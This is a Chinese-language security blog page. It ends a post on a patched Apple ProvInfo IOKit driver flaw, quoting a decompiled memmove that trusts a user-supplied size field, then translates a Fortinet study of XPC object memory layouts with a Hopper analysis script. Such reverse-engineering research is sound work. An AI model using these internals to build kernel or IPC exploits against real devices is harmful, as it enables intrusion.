<li>identityserviced</li>
</ol>
<p>下一步是找出如何从外部调用此函数，此函数通过驱动程序的<strong>externalMethod</strong>接口直接暴露给用户空间。对<strong>ProvInfoIOKitUserClient::getTargetAndMethodForIndex 的</strong>检查表明驱动程序为用户空间提供了 6 种不同的外部方法。这些方法是：</p>
<ol>
<li>ucGenerateSeed（混淆名称：fpXqy2dxjQo7）</li>
<li>ucGenerateInFieldSeed（混淆名称：afpHseTGo8s）</li>
<li>ucExchangeWithHoover（混淆名称：AEWpRs）</li>
<li>ucGetEntcryptedSeedSegment</li>
<li>ucEncryptSUInfo</li>
<li>ucEncryptWithWrapperKey</li>
</ol>
<p>查看<strong>ucEncryptSUInfo</strong>和**ucEncryptWithWrapperKey **时会发现，这两个函数也被patch了，都有大小检查。</p>
<p><img src="https://www.antid0te.com/images/ProvInfo_ucencryptsuinfo.png"></p>
<p><img src="https://www.antid0te.com/images/ProvInfo_ucencryptwithwrapperkey.png"></p>
<p>最终，在未patch之前，代码完全信任了用户传入的参数结构中的大小字段，从而导致内存损坏。</p>
<p>PZ发现的漏洞利用链中，攻击者控制<code>struct_in</code>的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ProvInfoIOKitUserClient::ucEncryptSUInfo(char* struct_in,</span><br><span class="line">                                         char* struct_out)&#123;</span><br><span class="line">  memmove(&amp;struct_out[4],</span><br><span class="line">          &amp;struct_in[4],</span><br><span class="line">          *(uint32_t*)&amp;struct_in[0x7d4]);</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/20/XPC%E9%80%86%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/20/XPC%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">XPC逆向</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-20 21:42:30" itemprop="dateCreated datePublished" datetime="2021-12-20T21:42:30+08:00">2021-12-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-09 14:16:38" itemprop="dateModified" datetime="2022-04-09T14:16:38+08:00">2022-04-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects">https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects</a></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XPC是macOS&#x2F;iOS中使用的加强版IPC，自10.7&#x2F;5.0版本引入。</p>
<p>API本身分为对象API和传输API，XPC通过libxpc.dylib提供自己的数据类型，如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image.img.png/1544747094233/look-into-xpc-internals-image1.png" style="zoom:50%;" />

<p>从 C API 的角度来看，所有对象都只是“xpc_object_t”。实际类型可以由函数 xpc_get_type(xpc_object_t) 动态确定。所有数据类型都可以使用相应的 xpc_objectType_create 函数创建，并且所有这些函数都调用函数 <code>_xpc_base_create(Class, Size)</code>，size是指定对象的大小，class是基类<code>_OS_xpc_type_ *</code>中的一个。可以在IDA或Hopper中查看哪些函数调用了<code>_xpc_base_create(Class, Size)</code>。</p>
<p>Hopper自动化查询脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_last2instructions_addr</span>(<span class="params">seg, x</span>):</span><br><span class="line">                  last1ins_addr = seg.getInstructionStart(x - <span class="number">1</span>)</span><br><span class="line">                  last2ins_addr = seg.getInstructionStart(last1ins_addr - <span class="number">1</span>)</span><br><span class="line">                  last2ins = seg.getInstructionAtAddress(last2ins_addr)</span><br><span class="line">                  last1ins = seg.getInstructionAtAddress(last1ins_addr)</span><br><span class="line">                  <span class="built_in">print</span> <span class="built_in">hex</span>(last2ins_addr), last2ins.getInstructionString(), last2ins.getRawArgument(<span class="number">0</span>), last2ins.getRawArgument(<span class="number">1</span>)</span><br><span class="line">                  <span class="built_in">print</span> <span class="built_in">hex</span>(last1ins_addr), last1ins.getInstructionString(), last1ins.getRawArgument(<span class="number">0</span>), last1ins.getRawArgument(<span class="number">1</span>)</span><br><span class="line">                  <span class="keyword">return</span> last2ins,last1ins</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">                  <span class="built_in">print</span> <span class="string">&#x27;[*] Demonstrating XPC ojbect sizes using a hopper diassembler\&#x27;s python script&#x27;</span></span><br><span class="line">                  xpc_object_sizes_dict = <span class="built_in">dict</span>()</span><br><span class="line">                  doc = Document.getCurrentDocument()</span><br><span class="line">                  _xpc_base_create_addr = doc.getAddressForName(<span class="string">&#x27;__xpc_base_create&#x27;</span>)</span><br><span class="line">                  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(doc.getSegmentCount()):</span><br><span class="line">                                    seg = doc.getSegment(i)</span><br><span class="line">                                    <span class="comment">#print &#x27;[*]&#x27;+ seg.getName()</span></span><br><span class="line">                                    <span class="keyword">if</span>(<span class="string">&#x27;__TEXT&#x27;</span> == seg.getName()):</span><br><span class="line">                                                      eachxrefs = seg.getReferencesOfAddress(_xpc_base_create_addr)</span><br><span class="line">                                                      <span class="keyword">for</span> x <span class="keyword">in</span> eachxrefs:</span><br><span class="line">                                                                        last2ins,last1ins = get_last2instructions_addr(seg,x)</span><br><span class="line">                                                                        p = seg.getProcedureAtAddress(x)</span><br><span class="line">                                                                        p_entry_addr =  p.getEntryPoint()</span><br><span class="line">                                                                        pname = seg.getNameAtAddress(p_entry_addr)</span><br><span class="line">                                                                        x_symbol = pname + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">hex</span>(x - p_entry_addr)</span><br><span class="line">                                                                        <span class="built_in">print</span> <span class="built_in">hex</span>(x),<span class="string">&#x27;(&#x27;</span> + x_symbol + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                                                                        ins0 = seg.getInstructionAtAddress(x - <span class="number">5</span>)</span><br><span class="line">                                                                        ins1 = seg.getInstructionAtAddress(x - <span class="number">12</span>)</span><br><span class="line">                                                                        <span class="keyword">if</span> last2ins.getInstructionString() == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> last1ins.getInstructionString() == <span class="string">&#x27;lea&#x27;</span>:</span><br><span class="line">                                                                                          <span class="keyword">if</span> last2ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;esi&#x27;</span> <span class="keyword">and</span> last1ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rdi&#x27;</span>:                                                                                                            indirect_addr = <span class="built_in">int</span>(last1ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>],<span class="number">16</span>)                                                                                                            xpcObj_len = last2ins.getRawArgument(<span class="number">1</span>)                                                                                                            callerinfo = <span class="string">&#x27;__xpc_base_create(&#x27;</span>+ doc.getNameAtAddress(indirect_addr)+<span class="string">&#x27;,&#x27;</span> + xpcObj_len+ <span class="string">&#x27;);&#x27;</span>                                                                                                            <span class="keyword">if</span> callerinfo <span class="keyword">not</span> <span class="keyword">in</span> xpc_object_sizes_dict.keys():                                                                                                                              xpc_object_sizes_dict[callerinfo] = <span class="string">&#x27;#from &#x27;</span> + x_symbol                                                                                                           <span class="keyword">else</span>:                                                                                                                             xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + <span class="string">&#x27;,&#x27;</span> + x_symbol                                                                                                            <span class="built_in">print</span> callerinfo                                                                                                            <span class="comment">#xpc_object_sizes_list.append(callerinfo)</span></span><br><span class="line">                                                                        <span class="keyword">elif</span> last2ins.getInstructionString() == <span class="string">&#x27;lea&#x27;</span> <span class="keyword">and</span> last1ins.getInstructionString() == <span class="string">&#x27;mov&#x27;</span>:</span><br><span class="line">                                                                                          <span class="keyword">if</span> last2ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rdi&#x27;</span> <span class="keyword">and</span> last1ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;esi&#x27;</span>:                                                                                                            indirect_addr = <span class="built_in">int</span>(last2ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>],<span class="number">16</span>)                                                                                                            xpcObj_len = last1ins.getRawArgument(<span class="number">1</span>)                                                                                                            callerinfo = <span class="string">&#x27;__xpc_base_create(&#x27;</span>+ doc.getNameAtAddress(indirect_addr)+<span class="string">&#x27;,&#x27;</span> + xpcObj_len+ <span class="string">&#x27;);&#x27;</span>                                                                                                            <span class="keyword">if</span> callerinfo <span class="keyword">not</span> <span class="keyword">in</span> xpc_object_sizes_dict.keys():                                                                                                                              xpc_object_sizes_dict[callerinfo] = <span class="string">&#x27;#from &#x27;</span> + x_symbol                                                                                                            <span class="keyword">else</span>:                                                                                                                              xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + <span class="string">&#x27;,&#x27;</span> + x_symbol                                                                                                            <span class="built_in">print</span> callerinfo                                                                                                            <span class="comment">#xpc_object_sizes_list.append(callerinfo)</span></span><br><span class="line">                                                                        <span class="keyword">elif</span> last2ins.getInstructionString() == <span class="string">&#x27;lea&#x27;</span> <span class="keyword">and</span> last1ins.getInstructionString() == <span class="string">&#x27;lea&#x27;</span>:</span><br><span class="line">                                                                                          <span class="keyword">if</span> last2ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rsi&#x27;</span> <span class="keyword">and</span> last1ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rdi&#x27;</span>:                                                                                                            indirect_addr = <span class="built_in">int</span>(last1ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>],<span class="number">16</span>)                                                                                                           xpcObj_len = last2ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>]                                                                                                            callerinfo = <span class="string">&#x27;__xpc_base_create(&#x27;</span>+ doc.getNameAtAddress(indirect_addr)+<span class="string">&#x27;,&#x27;</span> + xpcObj_len+ <span class="string">&#x27;);&#x27;</span>                                                                                                            <span class="keyword">if</span> callerinfo <span class="keyword">not</span> <span class="keyword">in</span> xpc_object_sizes_dict.keys():                                                                                                                             xpc_object_sizes_dict[callerinfo] = <span class="string">&#x27;#from &#x27;</span> + x_symbol                                                                                                            <span class="keyword">else</span>:                                                                                                                              xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + <span class="string">&#x27;,&#x27;</span> + x_symbol                                                                                                          <span class="built_in">print</span> callerinfo                                                                                                           <span class="comment">#xpc_object_sizes_list.append(callerinfo)</span></span><br><span class="line">                                                                                          <span class="keyword">elif</span> last2ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rdi&#x27;</span> <span class="keyword">and</span> last1ins.getRawArgument(<span class="number">0</span>) == <span class="string">&#x27;rsi&#x27;</span>:                                                                                                            indirect_addr = <span class="built_in">int</span>(last2ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>],<span class="number">16</span>)                                                                                                            xpcObj_len = last1ins.getRawArgument(<span class="number">1</span>)[<span class="number">7</span>:-<span class="number">1</span>]                                                                                                            callerinfo = <span class="string">&#x27;__xpc_base_create(&#x27;</span>+ doc.getNameAtAddress(indirect_addr)+<span class="string">&#x27;,&#x27;</span> + xpcObj_len+ <span class="string">&#x27;);&#x27;</span>                                                                                                            <span class="keyword">if</span> callerinfo <span class="keyword">not</span> <span class="keyword">in</span> xpc_object_sizes_dict.keys():                                                                                                                              xpc_object_sizes_dict[callerinfo] = <span class="string">&#x27;#from &#x27;</span> + x_symbol                                                                                                            <span class="keyword">else</span>:                                                                                                                              xpc_object_sizes_dict[callerinfo] = xpc_object_sizes_dict[callerinfo] + <span class="string">&#x27;,&#x27;</span> + x_symbol                                                                                                            <span class="built_in">print</span> callerinfo                                                                                                            <span class="comment">#xpc_object_sizes_list.append(callerinfo)</span></span><br><span class="line">                                                                        <span class="built_in">print</span> <span class="string">&#x27;____________________________________________________________&#x27;</span></span><br><span class="line">                  dict_len = <span class="built_in">len</span>(xpc_object_sizes_dict)</span><br><span class="line">                  <span class="built_in">print</span> <span class="string">&#x27;[*] Total of XPC object: %d&#x27;</span> % dict_len</span><br><span class="line">                  <span class="keyword">for</span> key <span class="keyword">in</span> xpc_object_sizes_dict.keys():</span><br><span class="line">                                    <span class="built_in">print</span> key, xpc_object_sizes_dict[key]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                  run()</span><br></pre></td></tr></table></figure>

<p>由脚本可以知道所有的XPC对象的大小，_xpc_base_create()函数的实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__text:0000000000003538 __xpc_base_create proc near             ; CODE XREF: __xpc_array_copy+1E↓p</span><br><span class="line">__text:0000000000003538                                         ; __xpc_array_deserialize+72↓p ...</span><br><span class="line">__text:0000000000003538 ; __unwind &#123;</span><br><span class="line">__text:0000000000003538                 add     rsi, 18h</span><br><span class="line">__text:000000000000353C                 jmp     __os_object_alloc_realized</span><br><span class="line">__text:000000000000353C ; &#125; // starts at 3538</span><br><span class="line">__text:000000000000353C __xpc_base_create endp</span><br></pre></td></tr></table></figure>

<p>也就是所有XPC对象的大小等于size+0x18，然后来检查所有对象的内存布局。</p>
<h1 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h1><h2 id="xpc-int64-t"><a href="#xpc-int64-t" class="headerlink" title="xpc_int64_t"></a>xpc_int64_t</h2><p>我们使用函数 xpc_int64_create 创建一个 xpc_int64_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_528293225.img.png/1544747379068/look-into-xpc-internals-image-sec1-1.png"></p>
<p>下面是LLDB中对象xpc_int64_t的内存布局:</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1808734819.img.png/1544747412312/look-into-xpc-internals-image-sec1-2.png"></p>
<p>对象 xpc_uint64_t 的结构如下所示:</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1157687312.img.png/1544747437382/look-into-xpc-internals-image5.png" style="zoom: 67%;" />

<h2 id="xpc-uint64-t"><a href="#xpc-uint64-t" class="headerlink" title="xpc_uint64_t"></a>xpc_uint64_t</h2><p>使用函数 xpc_uint64_create 创建一个 xpc_uint64_t 对象，如下所示:</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820.img.png/1544747467752/look-into-xpc-internals-image-sec2-1.png"></p>
<p>可以看到返回值不是有效的内存地址。它应该通过对输入参数进行一些算术运算来生成。在这种情况下，它直接使用一个 64 位无符号整数来表示对象 xpc_uint64_t:</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922.img.png/1544747483485/look-into-xpc-internals-image-sec2-2.png"></p>
<p>看另一个创建 xpc_uint64_t 对象的案例:</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop.img.png/1544747505961/look-into-xpc-internals-image-sec2-3.png"></p>
<p>下面是LLDB中对象xpc_uint64_t的内存布局:</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_1926283031.img.png/1544747528701/look-into-xpc-internals-image-sec2-4.png"></p>
<p>可以看到返回值指向的内存缓冲区代表对象 xpc_uint64_t 并且给定的输入参数位于偏移量 0x18 处。</p>
<p>接下来，让我们深入了解函数 xpc_uint64_create 的实现。下面是它的实现：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop.img.png/1544747559193/look-into-xpc-internals-image6.png"></p>
<p>在这个函数中，它首先对参数进行 52 位的逻辑右移。</p>
<p>  a) 如果结果不等于 0，则调用函数 _xpc_base_create 来创建 XPC 对象。然后它将 0x08（4 字节长度）写入缓冲区 0x14 处的偏移量。最后，它还将参数（8 字节长度）写入缓冲区 0x18 处的偏移量。</p>
<p>  b) 如果结果等于 0 并且全局变量 objc_debug_taggedpointer_mask 不为零，则它通过 (value &lt;&lt; 0xc | 0x4f) ^ objc_debug_taggedpointer_obfuscator 进行算术运算。在调试器 LLDB 中，我们可以看到变量 objc_debug_taggedpointer_obfuscator 等于 0x5de9b03e5c731aae。所以算术运算的结果等于 0x5de9b42a48670ae1。该值是函数_xpc_uint64_create 的返回值。如果结果为零，则与 (a.) 相同</p>
<p>我们可以看一下全局变量<em>objc_debug_taggedpointer_mask</em>和<em>objc_debug_taggedpointer_obfuscator</em>的值。</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_287243728.img.png/1544747592110/look-into-xpc-internals-image-sec2-5.png" style="zoom:67%;" />

<p>一旦我们有了变量 objc_debug_taggedpointer_obfuscator 的值，我们就可以计算返回值。</p>
<p>全局变量<em>objc_debug_taggedpointer_obfuscator</em> 对于每个新流程实例都是随机的。现在让我们追踪它是如何生成的以及它来自哪里。</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_1548792091.img.png/1544747616778/look-into-xpc-internals-image-sec2-7.png"></p>
<p>我们可以看到变量 objc_debug_taggedpointer_obfuscator 实际上是库 libobjc.A.dylib 中的一个全局变量。以下代码（位于 objc4-750&#x2F;runtime&#x2F;objc-runtime-new.mm 中）用于随机初始化 objc_debug_taggedpointer_obfuscator。</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_1989251591.img.png/1544747623058/look-into-xpc-internals-image7.png" style="zoom:50%;" />

<p>最后总结一下对象xpc_uint64_t的结构如下:</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_415043406.img.jpeg/1544747633231/look-into-xpc-internals-image8.jpeg" style="zoom:50%;" />

<h2 id="xpc-uuid-t"><a href="#xpc-uuid-t" class="headerlink" title="xpc_uuid_t"></a>xpc_uuid_t</h2><p>我们使用函数 xpc_uuid_create 创建一个 xpc_uuid_t 对象（UUID：通用唯一标识符），如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_709229857.img.png/1544747659945/look-into-xpc-internals-image-sec3-1.png"></p>
<p>下面是LLDB中对象xpc_uuid_t的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_1785563436.img.png/1544747665530/look-into-xpc-internals-image-sec3-2.png"></p>
<p>可以很容易地根据内存布局推算出对象 xpc_uuid_t 的结构：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1065408437.img.png/1544747695112/look-into-xpc-internals-image9.png" style="zoom:67%;" />

<h2 id="xpc-double-t"><a href="#xpc-double-t" class="headerlink" title="xpc_double_t"></a>xpc_double_t</h2><p>我们使用函数 xpc_double_create 创建一个 xpc_double_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_692924388.img.png/1544747711689/look-into-xpc-internals-image-sec4-1.png"></p>
<p>下面是LLDB中对象xpc_double_t的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_1847318178.img.png/1544747726578/look-into-xpc-internals-image-sec4-2.png"></p>
<p>对象 xpc_double_t 的结构如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1065408437_cop.img.png/1544747744901/look-into-xpc-internals-image10.png" style="zoom:67%;" />

<h2 id="xpc-date-t"><a href="#xpc-date-t" class="headerlink" title="xpc_date_t"></a>xpc_date_t</h2><p>我们使用函数 xpc_date_create 创建一个 xpc_date_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_1236900954.img.png/1544747768237/look-into-xpc-internals-image-sec5-1.png"></p>
<p>下面是LLDB中对象xpc_date_t的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_284410915.img.png/1544747797638/look-into-xpc-internals-image-sec5-2.png"></p>
<p>对象 xpc_date_t 的结构如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1626619382.img.png/1544747861668/look-into-xpc-internals-image11.png" style="zoom:67%;" />

<h2 id="xpc-string-t"><a href="#xpc-string-t" class="headerlink" title="xpc_string_t"></a>xpc_string_t</h2><p>使用函数 xpc_string_create 创建一个 xpc_string_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1065408437_cop_1851236984.img.png/1544747929485/look-into-xpc-internals-image-sec6-1.png"></p>
<p>下面是LLDB中对象xpc_string_t的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1216829523.img.png/1544747919735/look-into-xpc-internals-image-sec6-2.png"></p>
<p>对象 xpc_string_t 的结构如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1907220794.img.png/1544747950724/look-into-xpc-internals-image12.png" style="zoom:67%;" />

<h2 id="xpc-array-t"><a href="#xpc-array-t" class="headerlink" title="xpc_array_t"></a>xpc_array_t</h2><p>我们使用函数 xpc_array_create 创建一个 xpc_array_t 对象，如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_43025937.img.png/1544747994882/look-into-xpc-internals-image-sec7-1.png" style="zoom:67%;" />

<p>在这个例子中，我们首先创建一个 xpc_array_t 对象，然后将三个值附加到数组中。下面是 xpc_array_create 函数的声明：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_728129475.img.png/1544748003679/look-into-xpc-internals-image-sec7-2.png"></p>
<p>xpc_array_create函数的实现：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1065408437_cop_276405410.img.png/1544748042907/look-into-xpc-internals-image13.png" style="zoom:50%;" />

<p>我们可以看到数组的容量等于(count<em>2+0x08)，存储在偏移量0x1c(四个字节)处。指向已分配缓冲区的指针存储在偏移量 0x20 处。分配的缓冲区大小等于(count</em>2+0x8)*0x8。</p>
<p>然后我们可以检查这个对象在 LLDB 中的内存布局，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1779547284.img.png/1544748058411/look-into-xpc-internals-image-sec7-3.png"></p>
<p>数组的长度存储在偏移量 0x18（四个字节）处。偏移量 0x20 处的指针指向分配的 xpc_object_t 缓冲区，该缓冲区存储数组中的所有元素（xpc_object_t）。对象 xpc_array_t 的结构如下所示：</p>
<img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_107111721.img.png/1544748079115/look-into-xpc-internals-image14.png" style="zoom:67%;" />

<h2 id="xpc-data-t"><a href="#xpc-data-t" class="headerlink" title="xpc_data_t"></a>xpc_data_t</h2><p>我们使用函数 xpc_data_create 创建一个 xpc_data_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_1469812069.img.png/1544748088844/look-into-xpc-internals-image-sec8-1.png"></p>
<p>下面是LLDB中对象xpc_data_t的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_1133442350.img.png/1544748100849/look-into-xpc-internals-image-sec8-2.png"></p>
<p>如果数据缓冲区的长度小于等于0x4000，则偏移0x14处的值等于(length+0x7)&amp;0xfffffffc，否则为0x04，对象 xpc_data_t 的结构如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1065408437_cop_256960543.img.jpeg/1544748118819/look-into-xpc-internals-image15.jpeg"></p>
<h2 id="xpc-dictionary-t"><a href="#xpc-dictionary-t" class="headerlink" title="xpc_dictionary_t"></a>xpc_dictionary_t</h2><p>xpc_dictionary_t 类型在 XPC 中扮演着重要的角色。所有消息都作为字典在端点之间传递，这使得序列化&#x2F;反序列化变得容易。xpc_dictionary_t 的内部结构比其他原始类型更复杂。</p>
<p>使用函数 xpc_dictionary_create 创建一个 xpc_dictionary_t 对象，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2076493820_cop_1210629881.img.png/1544748134483/look-into-xpc-internals-image-sec9-1.png"></p>
<p>下面是LLDB中xpc_dictionary_t对象的内存布局：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1311663922_cop_746524120.img.jpeg/1544748149056/look-into-xpc-internals-image-sec9-2.jpeg"></p>
<p>字段 hash_buckets 是一个长度为 7 的数组。 hash_buckets[7] 中的每个元素都存储 XPC 字典链表条目。这里我们以 hash_buckets[3] 为例来检查它的内存布局。</p>
